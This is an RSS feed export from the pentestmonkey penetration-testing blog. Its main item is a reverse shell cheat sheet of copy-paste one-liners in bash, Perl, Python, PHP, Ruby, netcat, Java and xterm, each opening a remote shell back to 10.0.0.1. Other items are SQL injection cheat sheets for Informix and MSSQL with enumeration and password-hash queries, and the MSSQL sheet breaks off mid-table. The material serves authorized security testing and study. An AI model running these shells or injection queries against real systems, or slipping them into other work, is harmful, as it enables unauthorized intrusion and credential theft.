<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
	xmlns:content="http://purl.org/rss/1.0/modules/content/"
	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
	xmlns:dc="http://purl.org/dc/elements/1.1/"
	xmlns:atom="http://www.w3.org/2005/Atom"
	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
	>

<channel>
	<title>cheatsheet &#8211; pentestmonkey</title>
	<atom:link href="https://pentestmonkey.net/tag/cheatsheet/feed" rel="self" type="application/rss+xml" />
	<link>https://pentestmonkey.net</link>
	<description>Taking the monkey work out of pentesting</description>
	<lastBuildDate>Sat, 10 Mar 2012 19:00:28 +0000</lastBuildDate>
	<language>en-US</language>
	<sy:updatePeriod>
	hourly	</sy:updatePeriod>
	<sy:updateFrequency>
	1	</sy:updateFrequency>
	<generator>https://wordpress.org/?v=5.8.3</generator>
	<item>
		<title>Reverse Shell Cheat Sheet</title>
		<link>https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</link>
		
		<dc:creator><![CDATA[pentestmonkey]]></dc:creator>
		<pubDate>Sun, 04 Sep 2011 15:50:49 +0000</pubDate>
				<category><![CDATA[Shells]]></category>
		<category><![CDATA[bash]]></category>
		<category><![CDATA[cheatsheet]]></category>
		<category><![CDATA[netcat]]></category>
		<category><![CDATA[pentest]]></category>
		<category><![CDATA[perl]]></category>
		<category><![CDATA[php]]></category>
		<category><![CDATA[python]]></category>
		<category><![CDATA[reverseshell]]></category>
		<category><![CDATA[ruby]]></category>
		<category><![CDATA[xterm]]></category>
		<guid isPermaLink="false">http://pentestmonkey.net/?p=175</guid>

					<description><![CDATA[If you&#8217;re lucky enough to find a command execution vulnerability during a penetration test, pretty soon afterwards you&#8217;ll probably want an interactive shell. If it&#8217;s not possible to add a new account / SSH key / .rhosts file and just log in, your next step is likely to be either trowing back a reverse shell or binding [&#8230;]]]></description>
										<content:encoded><![CDATA[<p>If you&#8217;re lucky enough to find a command execution vulnerability during a penetration test, pretty soon afterwards you&#8217;ll probably want an interactive shell.</p>
<p>If it&#8217;s not possible to add a new account / SSH key / .rhosts file and just log in, your next step is likely to be either trowing back a reverse shell or binding a shell to a TCP port.  This page deals with the former.</p>
<p>Your options for creating a reverse shell are limited by the scripting languages installed on the target system &#8211; though you could probably upload a binary program too if you&#8217;re suitably well prepared.</p>
<p>The examples shown are tailored to Unix-like systems.  Some of the examples below should also work on Windows if you use substitute &#8220;/bin/sh -i&#8221; with &#8220;cmd.exe&#8221;.</p>
<p>Each of the methods below is aimed to be a one-liner that you can copy/paste.  As such they&#8217;re quite short lines, but not very readable.</p>
<h3>Bash</h3>
<p>Some versions of <a href="http://www.gnucitizen.org/blog/reverse-shell-with-bash/">bash can send you a reverse shell</a> (this was tested on Ubuntu 10.10):</p>
<pre>bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1</pre>
<h3>PERL</h3>
<p>Here&#8217;s a shorter, feature-free version of the <a href="http://pentestmonkey.net/tools/web-shells/perl-reverse-shell">perl-reverse-shell</a>:</p>
<pre>perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};'</pre>
<p>There&#8217;s also an <a href="http://www.plenz.com/reverseshell">alternative PERL revere shell here</a>.</p>
<h3>Python</h3>
<p>This was tested under Linux / Python 2.7:</p>
<pre>python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</pre>
<h3>PHP</h3>
<p>This code assumes that the TCP connection uses file descriptor 3.  This worked on my test system.  If it doesn&#8217;t work, try 4, 5, 6&#8230;</p>
<pre>php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</pre>
<p>If you want a .php file to upload, see the more featureful and robust <a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell">php-reverse-shell</a>.</p>
<h3>Ruby</h3>
<pre>ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d",f,f,f)'</pre>
<h3>Netcat</h3>
<p>Netcat is rarely present on production systems and even if it is there are several version of netcat, some of which don&#8217;t support the -e option.</p>
<pre>nc -e /bin/sh 10.0.0.1 1234</pre>
<p>If you have the wrong version of netcat installed, <a href="http://www.gnucitizen.org/blog/reverse-shell-with-bash/#comment-127498">Jeff Price points out here</a> that you might still be able to get your reverse shell back like this:</p>
<pre>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;/tmp/f</pre>
<h3>Java</h3>
<pre>r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done"] as String[])
p.waitFor()</pre>
<p>[Untested submission from anonymous reader]</p>
<h3>xterm</h3>
<p>One of the simplest forms of reverse shell is an xterm session.  The following command should be run on the server.  It will try to connect back to you (10.0.0.1) on TCP port 6001.</p>
<pre>xterm -display 10.0.0.1:1</pre>
<p>To catch the incoming xterm, start an X-Server (:1 &#8211; which listens on TCP port 6001).  One way to do this is with Xnest (to be run on your system):</p>
<pre>Xnest :1</pre>
<p>You&#8217;ll need to authorise the target to connect to you (command also run on your host):</p>
<pre>xhost +targetip</pre>
<h3>Further Reading</h3>
<p>Also check out <a href="http://bernardodamele.blogspot.com/2011/09/reverse-shells-one-liners.html">Bernardo&#8217;s Reverse Shell One-Liners</a>.  He has some alternative approaches and doesn&#8217;t rely on /bin/sh for his Ruby reverse shell.</p>
<p>There&#8217;s a <a href="http://www.gnucitizen.org/blog/reverse-shell-with-bash/#comment-122387">reverse shell written in gawk over here</a>.  Gawk is not something that I&#8217;ve ever used myself.  However, it seems to get installed by default quite often, so is exactly the sort of language pentesters might want to use for reverse shells.</p>
]]></content:encoded>
					
		
		
			</item>
		<item>
		<title>The Ultimate Unix Cheat Sheet</title>
		<link>https://pentestmonkey.net/blog/rosetta-stone-for-unix</link>
		
		<dc:creator><![CDATA[pentestmonkey]]></dc:creator>
		<pubDate>Sun, 14 Aug 2011 16:13:23 +0000</pubDate>
				<category><![CDATA[Blog]]></category>
		<category><![CDATA[audit]]></category>
		<category><![CDATA[cheatsheet]]></category>
		<category><![CDATA[unix]]></category>
		<guid isPermaLink="false">http://pentestmonkey.net/?p=227</guid>

					<description><![CDATA[I just stumbled across Rosetta Stone for Unix, a brilliant page that lists how to do a large number of tasks in a variety of unix-like operating systems.  I wish I&#8217;d found this years ago. It should be very handy for pentesting or auditing those less familiar unix flavours. I&#8217;ll definitely taking a copy with [&#8230;]]]></description>
										<content:encoded><![CDATA[<p>I just stumbled across <a href="http://bhami.com/rosetta.html">Rosetta Stone for Unix</a>, a brilliant page that lists how to do a large number of tasks in a variety of unix-like operating systems.  I wish I&#8217;d found this years ago.</p>
<p>It should be very handy for pentesting or auditing those less familiar unix flavours. I&#8217;ll definitely taking a copy with me on future tests.</p>
]]></content:encoded>
					
		
		
			</item>
		<item>
		<title>Informix SQL Injection Cheat Sheet</title>
		<link>https://pentestmonkey.net/cheat-sheet/sql-injection/informix-sql-injection-cheat-sheet</link>
					<comments>https://pentestmonkey.net/cheat-sheet/sql-injection/informix-sql-injection-cheat-sheet#respond</comments>
		
		<dc:creator><![CDATA[pentestmonkey]]></dc:creator>
		<pubDate>Sat, 22 Nov 2008 19:11:36 +0000</pubDate>
				<category><![CDATA[SQL Injection]]></category>
		<category><![CDATA[cheatsheet]]></category>
		<category><![CDATA[database]]></category>
		<category><![CDATA[informix]]></category>
		<guid isPermaLink="false">http://pentestmonkey.net/?p=89</guid>

					<description><![CDATA[Some useful syntax reminders for SQL Injection into Informix databases&#8230; Below are some tabulated notes on how to do many of thing you&#8217;d normally do via SQL injection.  All tests were performed on Informix Dynamic Server Express Edition 11.5 for Windows.  The Informix download page is here. This post is part of series of SQL [&#8230;]]]></description>
										<content:encoded><![CDATA[<p>Some useful syntax reminders for SQL Injection into Informix databases&#8230;</p>
<p><span id="more-89"></span></p>
<p>Below are some tabulated notes on how to do many of thing you&#8217;d normally do via SQL injection.  All tests were performed on Informix Dynamic Server Express Edition 11.5 for Windows.  The Informix download page is <a href="http://www.ibm.com/developerworks/downloads/im/dsexp/?S_TACT=105AGX11&amp;S_CMP=LP">here</a>.</p>
<p>This post is part of series of SQL Injection Cheat Sheets.  In this series, I&#8217;ve endevoured to tabulate the data to make it easier to read and to use the same table for for each database backend.  This helps to highlight any features which are lacking for each database, and enumeration techniques that don&#8217;t apply and also areas that I haven&#8217;t got round to researching yet.</p>
<p>The complete list of SQL Injection Cheat Sheets I&#8217;m working is:</p>
<ul>
<li><a href="http://pentestmonkey.net/blog/oracle-sql-injection-cheat-sheet/">Oracle</a></li>
<li><a href="http://pentestmonkey.net/blog/mssql-sql-injection-cheat-sheet/">MSSQL</a></li>
<li><a href="http://pentestmonkey.net/blog/mysql-sql-injection-cheat-sheet/">MySQL</a></li>
<li><a href="http://pentestmonkey.net/blog/postgres-sql-injection-cheat-sheet/">PostgreSQL</a></li>
<li><a href="http://pentestmonkey.net/blog/ingres-sql-injection-cheat-sheet/">Ingres</a></li>
<li><a href="http://pentestmonkey.net/blog/db2-sql-injection-cheat-sheet/">DB2</a></li>
<li><a href="http://pentestmonkey.net/blog/informix-sql-injection-cheat-sheet/">Informix</a></li>
</ul>
<p>I&#8217;m not planning to write one for MS Access, but there&#8217;s a great <a href="http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html">MS Access Cheat Sheet here</a>.</p>
<table border="1">
<tbody>
<tr>
<td>Version</td>
<td>SELECT DBINFO(&#8216;version&#8217;, &#8216;full&#8217;) FROM systables WHERE tabid = 1;<br />
SELECT DBINFO(&#8216;version&#8217;, &#8216;server-type&#8217;) FROM systables WHERE tabid = 1;<br />
SELECT DBINFO(&#8216;version&#8217;, &#8216;major&#8217;), DBINFO(&#8216;version&#8217;, &#8216;minor&#8217;), DBINFO(&#8216;version&#8217;, &#8216;level&#8217;) FROM systables WHERE tabid = 1;<br />
SELECT DBINFO(&#8216;version&#8217;, &#8216;os&#8217;) FROM systables WHERE tabid = 1; &#8212; T=Windows, U=32 bit app on 32-bit Unix, H=32-bit app running on 64-bit Unix, F=64-bit app running on 64-bit unix</td>
</tr>
<tr>
<td>Comments</td>
<td>select 1 FROM systables WHERE tabid = 1; &#8212; comment</td>
</tr>
<tr>
<td>Current User</td>
<td>SELECT USER FROM systables WHERE tabid = 1;<br />
select CURRENT_ROLE FROM systables WHERE tabid = 1;</td>
</tr>
<tr>
<td>List Users</td>
<td>select username, usertype, password from sysusers;</td>
</tr>
<tr>
<td>List Password Hashes</td>
<td>TODO</td>
</tr>
<tr>
<td>List Privileges</td>
<td>select tabname, grantor, grantee, tabauth FROM systabauth join systables on systables.tabid = systabauth.tabid; &#8212; which tables are accessible by which users<br />
select procname, owner, grantor, grantee from sysprocauth join sysprocedures on sysprocauth.procid = sysprocedures.procid; &#8212; which procedures are accessible by which users</td>
</tr>
<tr>
<td>List DBA Accounts</td>
<td>TODO</td>
</tr>
<tr>
<td>Current Database</td>
<td>SELECT DBSERVERNAME FROM systables where tabid = 1; &#8212; server name</td>
</tr>
<tr>
<td>List Databases</td>
<td>select name, owner from sysdatabases;</td>
</tr>
<tr>
<td>List Columns</td>
<td>select tabname, colname, owner, coltype FROM syscolumns join systables on syscolumns.tabid = systables.tabid;</td>
</tr>
<tr>
<td>List Tables</td>
<td>select tabname, owner FROM systables;<br />
select tabname, viewtext FROM sysviews  join systables on systables.tabid = sysviews.tabid;</td>
</tr>
<tr>
<td>List Stored Procedures</td>
<td>select procname, owner FROM sysprocedures;</td>
</tr>
<tr>
<td>Find Tables From Column Name</td>
<td>select tabname, colname, owner, coltype FROM syscolumns join systables on syscolumns.tabid = systables.tabid where colname like &#8216;%pass%&#8217;;</td>
</tr>
<tr>
<td>Select Nth Row</td>
<td>select first 1 tabid from (select first 10 tabid from systables order by tabid) as sq order by tabid desc; &#8212; selects the 10th row</td>
</tr>
<tr>
<td>Select Nth Char</td>
<td>SELECT SUBSTRING(&#8216;ABCD&#8217; FROM 3 FOR 1) FROM systables where tabid = 1; &#8212; returns &#8216;C&#8217;</td>
</tr>
<tr>
<td>Bitwise AND</td>
<td>select bitand(6, 1) from systables where tabid = 1; &#8212; returns 0<br />
select bitand(6, 2) from systables where tabid = 1; &#8212; returns 2</td>
</tr>
<tr>
<td>ASCII Value -&gt; Char</td>
<td>TODO</td>
</tr>
<tr>
<td>Char -&gt; ASCII Value</td>
<td>select ascii(&#8216;A&#8217;) from systables where tabid = 1;</td>
</tr>
<tr>
<td>Casting</td>
<td>select cast(&#8216;123&#8217; as integer) from systables where tabid = 1;<br />
select cast(1 as char) from systables where tabid = 1;</td>
</tr>
<tr>
<td>String Concatenation</td>
<td>SELECT &#8216;A&#8217; || &#8216;B&#8217; FROM systables where tabid = 1; &#8212; returns &#8216;AB&#8217;<br />
SELECT concat(&#8216;A&#8217;, &#8216;B&#8217;) FROM systables where tabid = 1; &#8212; returns &#8216;AB&#8217;</td>
</tr>
<tr>
<td>String Length</td>
<td>SELECT tabname, length(tabname), char_length(tabname), octet_length(tabname) from systables;</td>
</tr>
<tr>
<td>If Statement</td>
<td>TODO</td>
</tr>
<tr>
<td>Case Statement</td>
<td>select tabid, case when tabid&gt;10 then &#8220;High&#8221; else &#8216;Low&#8217; end from systables;</td>
</tr>
<tr>
<td>Avoiding Quotes</td>
<td>TODO</td>
</tr>
<tr>
<td>Time Delay</td>
<td>TODO</td>
</tr>
<tr>
<td>Make DNS Requests</td>
<td>TODO</td>
</tr>
<tr>
<td>Command Execution</td>
<td>TODO</td>
</tr>
<tr>
<td>Local File Access</td>
<td>TODO</td>
</tr>
<tr>
<td>Hostname, IP Address</td>
<td>SELECT DBINFO(&#8216;dbhostname&#8217;) FROM systables WHERE tabid = 1; &#8212; hostname</td>
</tr>
<tr>
<td>Location of DB files</td>
<td>TODO</td>
</tr>
<tr>
<td>Default/System Databases</td>
<td>These are the system databases:<br />
sysmaster<br />
sysadmin*<br />
sysuser*<br />
sysutils*</td>
</tr>
</tbody>
</table>
<p>* = don&#8217;t seem to contain anything / don&#8217;t allow readingInstalling Locally</p>
<p>You can download <a href="http://www.ibm.com/developerworks/downloads/im/dsexp/?S_TACT=105AGX11&amp;S_CMP=LP">Informix Dynamic Server Express Edition 11.5 Trial</a> for Linux and Windows.</p>
<p>Database ClientThere&#8217;s a <a href="http://www14.software.ibm.com/webapp/download/search.jsp?rs=ifxdl">database client SDK</a> available, but I couldn&#8217;t get the demo client working.<br />
I used <a href="http://squirrel-sql.sourceforge.net/">SQuirreL SQL Client Version 2.6.8</a> after installing the <a href="http://www14.software.ibm.com/webapp/download/search.jsp?go=y&amp;rs=ifxjdbc">Informix JDBC drivers</a> (&#8220;emerge dev-java/jdbc-informix&#8221; on Gentoo).Logging in from command line</p>
<p>If you get local admin rights on a Windows box and have a GUI logon:</p>
<ul>
<li>Click: Start | All Programs | IBM Informix Dynamic Server 11.50 | someservername.  This will give you a command prompt with various Environment variables set properly.</li>
<li>Run dbaccess.exe from your command prompt.  This will bring up a text-based GUI that allows you to browse databases.</li>
</ul>
<p>The following were set on my test system.  This may help if you get command line access, but can&#8217;t get a GUI &#8211; you&#8217;ll need to change &#8220;testservername&#8221;:</p>
<pre>set INFORMIXDIR=C:PROGRA~1IBMIBMINF~111.50
set INFORMIXSERVER=testservername
set ONCONFIG=ONCONFIG.testservername
set PATH=C:PROGRA~1IBMIBMINF~111.50bin;C:WINDOWSsystem32;C:WINDOWS;C:WINDOWSSystem32Wbem;C:PROGRA~1ibmgsk7bin;C:PROGRA~1ibmgsk7lib;C:Program FilesIBMInformixClien-SDKbin;C:Program Filesibmgsk7bin;C:Program Filesibmgsk7lib
set CLASSPATH=C:PROGRA~1IBMIBMINF~111.50extendkrakatoakrakatoa.jar;C:PROGRA~1IBMIBMINF~111.50xtendkrakatoajdbc.jar;
set DBTEMP=C:PROGRA~1IBMIBMINF~111.50infxtmp
set CLIENT_LOCALE=EN_US.CP1252
set DB_LOCALE=EN_US.8859-1
set SERVER_LOCALE=EN_US.CP1252
set DBLANG=EN_US.CP1252
mode con codepage select=1252</pre>
<pre>Identifying on the network</pre>
<p>My default installation listened on two TCP ports: 9088 and 9099.  When I created a new &#8220;server name&#8221;, this listened on 1526/TCP by default.  Nmap 4.76 didn&#8217;t identify these ports as Informix:</p>
<p>$ sudo nmap -sS -sV 10.0.0.1 -p- -v &#8211;version-all<br />
&#8230;<br />
1526/tcp open  pdap-np?<br />
9088/tcp open  unknown<br />
9089/tcp open  unknown<br />
&#8230;<br />
TODO How would we identify Informix listening on the network?</p>
<p>&nbsp;</p>
]]></content:encoded>
					
					<wfw:commentRss>https://pentestmonkey.net/cheat-sheet/sql-injection/informix-sql-injection-cheat-sheet/feed</wfw:commentRss>
			<slash:comments>0</slash:comments>
		
		
			</item>
		<item>
		<title>SQL Injection Cheat Sheets Updated</title>
		<link>https://pentestmonkey.net/blog/sqlics-update</link>
					<comments>https://pentestmonkey.net/blog/sqlics-update#respond</comments>
		
		<dc:creator><![CDATA[pentestmonkey]]></dc:creator>
		<pubDate>Tue, 21 Oct 2008 13:09:57 +0000</pubDate>
				<category><![CDATA[Blog]]></category>
		<category><![CDATA[cheatsheet]]></category>
		<category><![CDATA[pentest]]></category>
		<category><![CDATA[sqlinjection]]></category>
		<guid isPermaLink="false">http://pentestmonkey.net/?p=69</guid>

					<description><![CDATA[I had some really detailed feedback from Bernardo Damele A. G. on the SQL Injection Cheat Sheets.  I&#8217;ve just finished updating the cheat sheets for MSSQL, Oracle, MySQL and PostgreSQL . Thanks a lot Bernardo. If anyone else has suggestions, feel free to mail pentestmonkey at pentestmonkey dot net.]]></description>
										<content:encoded><![CDATA[<p>I had some really detailed feedback from <a href="http://bernardodamele.blogspot.com">Bernardo Damele A. G.</a> on the SQL Injection Cheat Sheets.  I&#8217;ve just finished updating the cheat sheets for <a href="http://pentestmonkey.net/blog/mssql-sql-injection-cheat-sheet/">MSSQL</a>, <a href="http://pentestmonkey.net/blog/oracle-sql-injection-cheat-sheet/">Oracle</a>, <a href="http://pentestmonkey.net/blog/mysql-sql-injection-cheat-sheet/">MySQL</a> and <a href="http://pentestmonkey.net/blog/postgres-sql-injection-cheat-sheet/">PostgreSQL</a> .</p>
<p>Thanks a lot Bernardo.</p>
<p>If anyone else has suggestions, feel free to mail pentestmonkey at pentestmonkey dot net.</p>
]]></content:encoded>
					
					<wfw:commentRss>https://pentestmonkey.net/blog/sqlics-update/feed</wfw:commentRss>
			<slash:comments>0</slash:comments>
		
		
			</item>
		<item>
		<title>Update to Postgres SQL Injection Cheat Sheet</title>
		<link>https://pentestmonkey.net/blog/postgresics-update3</link>
					<comments>https://pentestmonkey.net/blog/postgresics-update3#respond</comments>
		
		<dc:creator><![CDATA[pentestmonkey]]></dc:creator>
		<pubDate>Sun, 10 Aug 2008 11:39:32 +0000</pubDate>
				<category><![CDATA[Blog]]></category>
		<category><![CDATA[cheatsheet]]></category>
		<category><![CDATA[database]]></category>
		<category><![CDATA[postgresql]]></category>
		<category><![CDATA[sqlinjection]]></category>
		<guid isPermaLink="false">http://pentestmonkey.net/?p=60</guid>

					<description><![CDATA[Reiners spotted that I hadn&#8217;t included any info about writing files via SLQ injection in PostgreSQL.  I&#8217;ve update the Postgres Cheat Sheet accordingly.  Thanks Reiners. He&#8217;s also written some detailed blogs about SQL injection in MySQL that are worth reading: MySQL Table and Column Names MySQL Into Outfile &#160;]]></description>
										<content:encoded><![CDATA[<p><a href="http://websec.wordpress.com">Reiners</a> spotted that I hadn&#8217;t included any info about writing files via SLQ injection in PostgreSQL.  I&#8217;ve update the <a href="http://pentestmonkey.net/blog/postgres-sql-injection-cheat-sheet/">Postgres Cheat Sheet </a> accordingly.  Thanks Reiners.</p>
<p>He&#8217;s also written some detailed blogs about SQL injection in MySQL that are worth reading:</p>
<ul>
<li><a href="http://websec.wordpress.com/2007/11/17/mysql-table-and-column-names/">MySQL Table and Column Names</a></li>
<li><a href="http://websec.wordpress.com/2007/11/17/mysql-into-outfile/">MySQL Into Outfile</a></li>
</ul>
<p>&nbsp;</p>
]]></content:encoded>
					
					<wfw:commentRss>https://pentestmonkey.net/blog/postgresics-update3/feed</wfw:commentRss>
			<slash:comments>0</slash:comments>
		
		
			</item>
		<item>
		<title>SQL Cheat Sheet Updates</title>
		<link>https://pentestmonkey.net/blog/sqlics-managing-users</link>
					<comments>https://pentestmonkey.net/blog/sqlics-managing-users#respond</comments>
		
		<dc:creator><![CDATA[pentestmonkey]]></dc:creator>
		<pubDate>Tue, 08 Apr 2008 20:26:34 +0000</pubDate>
				<category><![CDATA[Blog]]></category>
		<category><![CDATA[cheatsheet]]></category>
		<category><![CDATA[sqlinjection]]></category>
		<guid isPermaLink="false">http://pentestmonkey.net/?p=48</guid>

					<description><![CDATA[I&#8217;ve recently updated the MySQL, MSSQL and PostgreSQL cheat sheets with some notes on creating and deleting users.  Info on granting DBA rights is also included. This is useful for those situtations where you&#8217;ve found a SQL inject as a privileged user and also have have access to the database port (1433/TCP or whatever).]]></description>
										<content:encoded><![CDATA[<p>I&#8217;ve recently updated the <a href="http://pentestmonkey.net/blog/mysql-sql-injection-cheat-sheet/">MySQL</a>, <a href="http://pentestmonkey.net/blog/mssql-sql-injection-cheat-sheet/">MSSQL</a> and <a href="http://pentestmonkey.net/blog/postgres-sql-injection-cheat-sheet/">PostgreSQL</a> cheat sheets with some notes on creating and deleting users.  Info on granting DBA rights is also included.</p>
<p>This is useful for those situtations where you&#8217;ve found a SQL inject as a privileged user and also have have access to the database port (1433/TCP or whatever).</p>
]]></content:encoded>
					
					<wfw:commentRss>https://pentestmonkey.net/blog/sqlics-managing-users/feed</wfw:commentRss>
			<slash:comments>0</slash:comments>
		
		
			</item>
		<item>
		<title>Updated Postgres SQL Injection Cheat Sheet</title>
		<link>https://pentestmonkey.net/blog/postgresics-update2</link>
					<comments>https://pentestmonkey.net/blog/postgresics-update2#respond</comments>
		
		<dc:creator><![CDATA[pentestmonkey]]></dc:creator>
		<pubDate>Mon, 21 Jan 2008 21:10:41 +0000</pubDate>
				<category><![CDATA[Blog]]></category>
		<category><![CDATA[cheatsheet]]></category>
		<category><![CDATA[postgresql]]></category>
		<category><![CDATA[sqlinjection]]></category>
		<guid isPermaLink="false">http://pentestmonkey.net/?p=38</guid>

					<description><![CDATA[I just put some finishing touches to the PostgreSQL Injection Cheat Sheet .  All the TODO items have been removed now.  Let me know if you have any extra info you think should be included on the cheat sheet.]]></description>
										<content:encoded><![CDATA[<p>I just put some finishing touches to the <a href="http://pentestmonkey.net/blog/postgres-sql-injection-cheat-sheet/">PostgreSQL Injection Cheat Sheet</a> .  All the TODO items have been removed now.  <a href="mailto:pentestmonkeyAATTpentestmonkey.net">Let me know</a> if you have any extra info you think should be included on the cheat sheet.</p>
]]></content:encoded>
					
					<wfw:commentRss>https://pentestmonkey.net/blog/postgresics-update2/feed</wfw:commentRss>
			<slash:comments>0</slash:comments>
		
		
			</item>
		<item>
		<title>Updated Postgres SQL Injection Cheat Sheet</title>
		<link>https://pentestmonkey.net/blog/postgresics-update</link>
					<comments>https://pentestmonkey.net/blog/postgresics-update#respond</comments>
		
		<dc:creator><![CDATA[pentestmonkey]]></dc:creator>
		<pubDate>Tue, 15 Jan 2008 08:35:08 +0000</pubDate>
				<category><![CDATA[Blog]]></category>
		<category><![CDATA[cheatsheet]]></category>
		<category><![CDATA[postgressql]]></category>
		<category><![CDATA[sqlinjection]]></category>
		<guid isPermaLink="false">http://pentestmonkey.net/?p=34</guid>

					<description><![CDATA[I just read Nico Leidecker&#8217;s Having Fun With Postgres paper.  He mostly talks about the dblink function which is sometimes enabled in Postgres &#8211; it&#8217;s a bit like MSSQL&#8217;s openrowset .  There&#8217;s also some good generic advice on what to do when you get DBA access &#8211; like exeucting OS-level commands.  I&#8217;ve updated the cheat [&#8230;]]]></description>
										<content:encoded><![CDATA[<p>I just read Nico Leidecker&#8217;s <a href="http://www.leidecker.info/pgshell/Having_Fun_With_PostgreSQL.html">Having Fun With Postgres</a> paper.  He mostly talks about the dblink function which is sometimes enabled in Postgres &#8211; it&#8217;s a bit like MSSQL&#8217;s <a href="http://msdn2.microsoft.com/en-us/library/ms190312.aspx">openrowset</a> .  There&#8217;s also some good generic advice on what to do when you get DBA access &#8211; like exeucting OS-level commands.  I&#8217;ve updated the <a href="http://pentestmonkey.net/blog/postgres-sql-injection-cheat-sheet/">cheat sheet</a> .  Good work Nico!</p>
]]></content:encoded>
					
					<wfw:commentRss>https://pentestmonkey.net/blog/postgresics-update/feed</wfw:commentRss>
			<slash:comments>0</slash:comments>
		
		
			</item>
		<item>
		<title>Update to MySQL Injection Cheat Sheet</title>
		<link>https://pentestmonkey.net/blog/mysqlics-update</link>
					<comments>https://pentestmonkey.net/blog/mysqlics-update#respond</comments>
		
		<dc:creator><![CDATA[pentestmonkey]]></dc:creator>
		<pubDate>Wed, 02 Jan 2008 22:26:42 +0000</pubDate>
				<category><![CDATA[Blog]]></category>
		<category><![CDATA[cheatsheet]]></category>
		<category><![CDATA[mysql]]></category>
		<category><![CDATA[sqlinjection]]></category>
		<guid isPermaLink="false">http://pentestmonkey.net/?p=31</guid>

					<description><![CDATA[I just added some more notes to the MySQL Injection Cheat Sheet about command executation, file upload, privilege enumeration, casting, avoiding quotes and more.  The cheat sheet is reasonably complete now.]]></description>
										<content:encoded><![CDATA[<p>I just added some more notes to the <a href="http://pentestmonkey.net/blog/mysql-sql-injection-cheat-sheet/">MySQL Injection Cheat Sheet</a> about command executation, file upload, privilege enumeration, casting, avoiding quotes and more.  The cheat sheet is reasonably complete now.</p>
]]></content:encoded>
					
					<wfw:commentRss>https://pentestmonkey.net/blog/mysqlics-update/feed</wfw:commentRss>
			<slash:comments>0</slash:comments>
		
		
			</item>
		<item>
		<title>MSSQL Injection Cheat Sheet</title>
		<link>https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet</link>
					<comments>https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet#respond</comments>
		
		<dc:creator><![CDATA[pentestmonkey]]></dc:creator>
		<pubDate>Tue, 27 Nov 2007 20:23:00 +0000</pubDate>
				<category><![CDATA[SQL Injection]]></category>
		<category><![CDATA[cheatsheet]]></category>
		<category><![CDATA[mssql]]></category>
		<category><![CDATA[sqlinjection]]></category>
		<guid isPermaLink="false">http://pentestmonkey.net/?p=88</guid>

					<description><![CDATA[Some useful syntax reminders for SQL Injection into MSSQL databases&#8230; This post is part of a series of SQL Injection Cheat Sheets.  In this series, I&#8217;ve endevoured to tabulate the data to make it easier to read and to use the same table for for each database backend.  This helps to highlight any features which [&#8230;]]]></description>
										<content:encoded><![CDATA[<p>Some useful syntax reminders for SQL Injection into MSSQL databases&#8230;<br />
<span id="more-88"></span></p>
<p>This post is part of a series of SQL Injection Cheat Sheets.  In this series, I&#8217;ve endevoured to tabulate the data to make it easier to read and to use the same table for for each database backend.  This helps to highlight any features which are lacking for each database, and enumeration techniques that don&#8217;t apply and also areas that I haven&#8217;t got round to researching yet.</p>
<p>The complete list of SQL Injection Cheat Sheets I&#8217;m working is:</p>
<ul>
<li><a href="http://pentestmonkey.net/blog/oracle-sql-injection-cheat-sheet/">Oracle</a></li>
<li><a href="http://pentestmonkey.net/blog/mssql-sql-injection-cheat-sheet/">MSSQL</a></li>
<li><a href="http://pentestmonkey.net/blog/mysql-sql-injection-cheat-sheet/">MySQL</a></li>
<li><a href="http://pentestmonkey.net/blog/postgres-sql-injection-cheat-sheet/">PostgreSQL</a></li>
<li><a href="http://pentestmonkey.net/blog/ingres-sql-injection-cheat-sheet/">Ingres</a></li>
<li><a href="http://pentestmonkey.net/blog/db2-sql-injection-cheat-sheet/">DB2</a></li>
<li><a href="http://pentestmonkey.net/blog/informix-sql-injection-cheat-sheet/">Informix</a></li>
</ul>
<p>I&#8217;m not planning to write one for MS Access, but there&#8217;s a great <a href="http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html">MS Access Cheat Sheet here</a>.</p>
<p>Some of the queries in the table below can only be run by an admin. These are marked with &#8220;&#8211; priv&#8221; at the end of the query.</p>
<table border="1">
<tbody>
<tr>
<td>Version</td>
<td>SELECT @@version</td>
</tr>
<tr>
<td>Comments</td>
<td>SELECT 1 &#8212; comment<br />
SELECT /*comment*/1</td>
</tr>
<tr>
<td>Current User</td>
<td>SELECT user_name();<br />
SELECT system_user;<br />
SELECT user;<br />
SELECT loginame FROM master..sysprocesses WHERE spid = @@SPID</td>
</tr>
<tr>
<td>List Users</td>
<td>SELECT name FROM master..syslogins</td>
</tr>
<tr>
<td>List Password Hashes</td>
<td>SELECT name, password FROM master..sysxlogins &#8212; priv, mssql 2000;<br />
SELECT name, master.dbo.fn_varbintohexstr(password) FROM master..sysxlogins &#8212; priv, mssql 2000.  Need to convert to hex to return hashes in MSSQL error message / some version of query analyzer.<br />
